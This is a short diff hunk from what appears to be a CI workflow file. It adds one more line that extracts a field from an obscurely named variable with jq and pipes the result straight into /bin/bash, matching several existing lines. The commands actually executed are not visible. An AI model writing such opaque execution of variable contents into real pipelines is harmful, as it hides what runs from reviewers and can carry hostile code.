@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$uc10128" | jq -r .utsv7953 | /bin/bash
           echo $l10793 | jq -r .rbe4120 | /bin/bash
           echo $giot5 | jq -r .gayu9 | /bin/bash
+          echo $kte86 | jq -r .jupzl89 | /bin/bash
 
       - name: Upload data
         if: always()
